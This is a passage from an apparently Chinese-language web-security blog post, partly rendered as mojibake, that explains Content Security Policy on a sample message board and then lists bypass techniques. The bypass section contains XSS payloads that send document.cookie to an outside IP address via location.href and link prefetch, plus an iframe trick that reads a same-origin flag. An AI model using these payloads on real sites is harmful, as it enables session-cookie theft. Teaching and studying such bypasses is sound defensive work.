</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;zh-CN&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Security-Policy&#34;</span> 
</span></span><span class="line"><span class="cl">          <span class="na">content</span><span class="o">=</span><span class="s">&#34;default-src &#39;self&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s">                   script-src &#39;self&#39; &#39;nonce-2726c7f26c9&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s">                   style-src &#39;self&#39; https://fonts.googleapis.com;
</span></span></span><span class="line"><span class="cl"><span class="s">                   font-src https://fonts.gstatic.com;
</span></span></span><span class="line"><span class="cl"><span class="s">                   img-src &#39;self&#39; data:;
</span></span></span><span class="line"><span class="cl"><span class="s">                   object-src &#39;none&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s">                   base-uri &#39;self&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s">                   form-action &#39;self&#39;&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>å®‰å…¨ç•™è¨€æ¿<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">style</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;2726c7f26c9&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">body</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">font-family</span><span class="p">:</span> <span class="s1">&#39;Roboto&#39;</span><span class="p">,</span> <span class="kc">sans-serif</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">max-width</span><span class="p">:</span> <span class="mi">800</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">margin</span><span class="p">:</span> <span class="mi">0</span> <span class="kc">auto</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">padding</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nc">container</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">background-color</span><span class="p">:</span> <span class="mh">#f5f5f5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">padding</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">border-radius</span><span class="p">:</span> <span class="mi">8</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">#</span><span class="nn">messageInput</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">width</span><span class="p">:</span> <span class="mi">70</span><span class="kt">%</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">padding</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">margin-right</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nt">button</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">padding</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">background-color</span><span class="p">:</span> <span class="mh">#4CAF50</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">color</span><span class="p">:</span> <span class="kc">white</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">border</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">border-radius</span><span class="p">:</span> <span class="mi">4</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">cursor</span><span class="p">:</span> <span class="kc">pointer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nc">message-item</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">background-color</span><span class="p">:</span> <span class="kc">white</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">padding</span><span class="p">:</span> <span class="mi">15</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">margin</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">border-radius</span><span class="p">:</span> <span class="mi">4</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">box-shadow</span><span class="p">:</span> <span class="mi">0</span> <span class="mi">2</span><span class="kt">px</span> <span class="mi">4</span><span class="kt">px</span> <span class="nb">rgba</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mf">0.1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;container&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>ç•™è¨€æ¿<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;messageForm&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> 
</span></span><span class="line"><span class="cl">                   <span class="na">id</span><span class="o">=</span><span class="s">&#34;messageInput&#34;</span> 
</span></span><span class="line"><span class="cl">                   <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;è¾“å…¥ä½ çš„ç•™è¨€...&#34;</span>
</span></span><span class="line"><span class="cl">                   <span class="na">required</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span><span class="p">&gt;</span>æäº¤<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;messages&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&#34;2726c7f26c9&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;messageForm&#39;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">messageInput</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;messageInput&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">messageInput</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">trim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">message</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">messageElement</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nx">messageElement</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="s1">&#39;message-item&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">messageElement</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">message</span><span class="p">;</span> <span class="c1">// ä½¿ç”¨textContentè€Œä¸æ˜¯innerHTMLé˜²æ­¢XSS
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                
</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;messages&#39;</span><span class="p">).</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">messageElement</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nx">messageInput</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç®€å•è§£æä¸€ä¸‹ï¼š</p>
<ul>
<li><code>default-src 'self'</code>ï¼šè®²å…¶ä»–æ²¡è®¾å®šçš„èµ„æºè®¾ç½®ä¸ºåŒæºã€‚</li>
<li><code>script-src 'self' 'nonce-2726c7f26c9'</code>ï¼šå…è®¸åŒæºè„šæœ¬ï¼Œå¹¶ä¸”ä½¿ç”¨äº†nonceæ¥å…è®¸ç‰¹å®šå†…è”è„šæœ¬ã€‚</li>
</ul>
<p>è¿™é‡Œæœ‰ä¸ªéœ€è¦è¯´æ˜ä¸€ä¸‹ï¼Œçœ‹åé¢çš„<code>&lt;style&gt;</code>ç­‰æ ‡ç­¾ï¼Œéƒ½æ˜¯è®¾ç½®äº†å†…è”tokençš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ¨æ€çš„è®¾ç½®è¿™ä¸ªtokenï¼Œæ¥è¾¾åˆ°æ˜¯å¦æ‰§è¡Œè¿™ä¸ªè„šæœ¬çš„é—®é¢˜ï¼Œåœ¨è¿™ä¸ªå‰ç«¯ä¸­ï¼Œæ˜¯ç›´æ¥é€šè¿‡<code>&lt;meta&gt;</code>æ ‡ç­¾æ¥è®¾ç½®çš„ï¼ŒåŒæ ·çš„ï¼ŒåŠ¨æ€çš„è¯è¿˜å¯ä»¥é€šè¿‡HTTPå“åº”å¤´æ¥è®¾ç½®.å¯ä»¥ç®€å•æ”¹æ”¹å‰é¢çš„å‰ç«¯è„šæœ¬æ¥è‡ªå·±ç†è§£ä¸€ä¸‹ã€‚</p>
<ul>
<li><code>style-src 'self' https://fonts.googleapis.com</code>ï¼šå…è®¸åŒæºæ ·å¼å’ŒGoogle Fontsçš„æ ·å¼</li>
<li><code>font-src https://fonts.gstatic.com</code>ï¼šå…è®¸ä»Googleå­—ä½“æœåŠ¡å™¨åŠ è½½å­—ä½“ã€‚</li>
<li><code> img-src 'self' data:</code>ï¼šå…è®¸åŒæºå›¾ç‰‡å’Œdata URLå›¾ç‰‡</li>
<li><code>object-src 'none'</code>ï¼šç¦ç”¨æ‰€æœ‰æ’ä»¶å†…å®¹</li>
<li><code>form-action 'self'</code>ï¼šé™åˆ¶è¡¨å•åªèƒ½æäº¤åˆ°åŒæºåœ°å€</li>
</ul>
<p><strong>æ³¨æ„</strong>ï¼šå¦‚æœè®¾ç½®äº†å¤šä¸ªæ¡ä»¶ï¼Œåªéœ€è¦æ»¡è¶³å…¶ä¸­ä¸€ä¸ªæ¡ä»¶å°±ä¼šå…è®¸åŒ¹é…ï¼Œä¸¤ä¸ªæ¡ä»¶æ˜¯ç‹¬ç«‹çš„ã€‚</p>
<p>è¿™é‡Œçš„jsä»£ç ä¹Ÿæ˜¯æ¯”è¾ƒä¹Ÿæœ‰ç‚¹æ„æ€ï¼Œæ˜¯å°†ç•™è¨€çš„å†…å®¹å†™å…¥åˆ°DOMæ ‘çš„ï¼Œé€šè¿‡Javascriptæ¥åŠ¨æ€åŠ è½½çš„ï¼Œç›´æ¥çœ‹ctrl+uæ˜¯çœ‹ä¸åˆ°çš„ï¼Œå¯ä»¥å»æ­ä¸ªå‰ç«¯äº†è§£ä¸€ä¸‹ã€‚</p>
<p>çœ‹äº†ä¸Šé¢çš„ä»£ç ï¼Œä¼šå¯¹CSPçš„é™åˆ¶ä¼šæ›´åŠ æ¸…æ¥šï¼Œå¦‚ä¸‹è¯´æ˜ä¸€ä¸‹ç»•è¿‡æ–¹æ³•ã€‚</p>
<h3 id="ç»•è¿‡æ‰‹æ®µ">ç»•è¿‡æ‰‹æ®µ
</h3><p>è¿™é‡Œå°±è¯´è¯´ä¸€ä¸‹æ¯”è¾ƒæœ‰æ„æ€çš„ç‚¹ã€‚</p>
<h5 id="å¯ä»¥åŠ¨æ€æ‰§è¡Œä»»æ„jsè„šæœ¬">å¯ä»¥åŠ¨æ€æ‰§è¡Œä»»æ„jsè„šæœ¬
</h5><p>å½“ç„¶æ˜¯å­˜åœ¨CSPé™åˆ¶å•¦ï¼Œåªä¸è¿‡è®¾ç½®çš„cspä¸º<code>script-src 'unsafe-inline'</code>ï¼Œä¹Ÿå°±æ˜¯å…è®¸<code>&lt;script&gt;</code>æ ‡ç­¾çš„æ‰§è¡Œã€‚</p>
<p>è¿™ä¸ªç»•è¿‡æ–¹æ³•ä¸ªäººæ„Ÿè§‰å…¶å®ä¸å¸¸è§ï¼Œéƒ½èƒ½éšä¾¿æ‰§è¡Œjsè„šæœ¬äº†ã€‚</p>
<h6 id="locationhref">location.href
</h6><p>CSPä¸å½±å“location.hrefè·³è½¬ï¼Œç›´æ¥å¦‚ä¸‹æ‰“å³å¯ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">&#34;http://47.100.223.173:2333?&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="p">;</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">&#34;http://47.100.223.173:2333?&#34;</span><span class="o">+</span><span class="nx">escape</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="linkæ ‡ç­¾çš„åˆ©ç”¨">linkæ ‡ç­¾çš„åˆ©ç”¨
</h6><p><strong>è€ç‰ˆæœ¬çš„æµè§ˆå™¨å¯ç”¨</strong>ï¼Œå½“æ—¶æ²¡æœ‰è¢«<code>&lt;meta&gt;</code>æ ‡ç­¾çº¦æŸï¼Œç®—æ˜¯æ¼æ‰çš„ï¼Œå·²ç»è¢«ä¿®å¤äº†ã€‚</p>
<p>ç¡¬å†™å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;link rel=&#34;prefetch&#34; href=&#34;//47.100.223.173:2333?${cookie}&#34;&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¾©è¯çœ‹å¾…å§ï¼Œå¸¦ä¸å‡ºcookieï¼Œå¯èƒ½æ˜¯cookieè·å–çš„é”™è¯¯ã€‚åæ­£èƒ½è®¿é—®åˆ°ipã€‚</p>
<p>é€šè¿‡jsä»£ç å¦‚ä¸‹å®ç°:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;link&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">link</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&#34;rel&#34;</span><span class="p">,</span> <span class="s2">&#34;prefetch&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">link</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&#34;href&#34;</span><span class="p">,</span> <span class="s2">&#34;//47.100.223.173:2333/?&#34;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">link</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·çš„jsä»£ç ä»£ç æ˜¯æˆåŠŸå¸¦å‡ºæ¥cookieçš„ã€‚</p>
<p>ä½†æ˜¯é™åˆ¶éƒ½æ¯”è¾ƒå¤§ï¼Œéœ€è¦å¯ä»¥æ‰§è¡Œä»»æ„JSè„šæœ¬ã€‚</p>
<h5 id="å…¶ä»–ç»•è¿‡æ–¹æ³•">å…¶ä»–ç»•è¿‡æ–¹æ³•
</h5><h6 id="ä½¿ç”¨iframeæ ‡ç­¾ç»•è¿‡">ä½¿ç”¨iframeæ ‡ç­¾ç»•è¿‡
</h6><p>æ‰€æœ‰çš„ä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒ<code>&lt;iframe&gt;</code>æ ‡ç­¾ï¼Œè¿™ä¸ªæ ‡ç­¾çš„å®šä¹‰å°±æ˜¯è§„å®šäº†ä¸€ä¸ªå†…è”æ¡†æ¶ï¼Œä¹Ÿå°±æ˜¯å®ƒèƒ½å¤Ÿå°†å¦ä¸€ä¸ªHTMLé¡µé¢åµŒå…¥åˆ°å½“å‰é¡µé¢ä¸­ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥æ€ä¹ˆåŠï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶å½“å‰çš„webæœåŠ¡ä¸­çš„ä¸€ä¸ªé¡µé¢çš„å†…å®¹ï¼Œè€Œå¦å¤–ä¸€ä¸ªé¡µé¢æ˜¯æœ‰æˆ‘æƒ³è¦çš„ä¸œè¥¿çš„ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥å°è¯•åœ¨èƒ½æ§åˆ¶å¾—é¡µé¢ä¸­ä½¿ç”¨iframeæ ‡ç­¾æ¥åµŒå…¥å¦ä¸€ä¸ªé¡µé¢ï¼Œç„¶åå°†å…¶æ‰“å°å¤„ç†å•Šï¼Œè¿™æ ·å°±èƒ½æˆåŠŸ<strong>ç»•è¿‡CSPçš„åŒæºé™åˆ¶</strong>å¾—åˆ°æƒ³è¦å¾—ä¸œè¥¿äº†</p>
<p>ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼š</p>
<p>ä»¥åŸå…ˆçš„ç•™è¨€æ¿çš„ä»£ç ä¸ºä¾‹ï¼š</p>
<p>app.htmlï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Security-Policy&#34;</span> 
</span></span><span class="line"><span class="cl">          <span class="na">content</span><span class="o">=</span><span class="s">&#34;default-src &#39;self&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s">                   script-src &#39;self&#39; &#39;nonce-2726c7f26c9&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s">                   style-src &#39;self&#39; https://fonts.googleapis.com;
</span></span></span><span class="line"><span class="cl"><span class="s">                   font-src https://fonts.gstatic.com;
</span></span></span><span class="line"><span class="cl"><span class="s">                   img-src &#39;self&#39; data:;
</span></span></span><span class="line"><span class="cl"><span class="s">                   object-src &#39;none&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s">                   base-uri &#39;self&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s">                   form-action &#39;self&#39;&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;flag&#34;</span><span class="p">&gt;</span>flag{text123}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>index.htmlï¼ˆå¯æ§é¡µé¢ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;iframe&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">iframe</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&#34;src&#34;</span><span class="p">,</span> <span class="s2">&#34;index.html&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s2">&#34;none&#34;</span><span class="p">;</span> <span class="c1">// éšè— iframe
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">iframe</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">flagElement</span> <span class="o">=</span> <span class="nx">iframe</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">flagElement</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">flagElement</span><span class="p">.</span><span class="nx">textContent</span><span class="p">);</span> <span class="c1">// è¾“å‡º flag å†…å®¹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Flag not found&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/body&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åå°è¯•å¦‚ä¸‹ï¼ŒæˆåŠŸåœ¨æ§åˆ¶å°è¾“å‡ºï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202502132038653.png"
	
	
	
	loading="lazy"
	
		alt="image-20250213203844349"
	
	
></p>
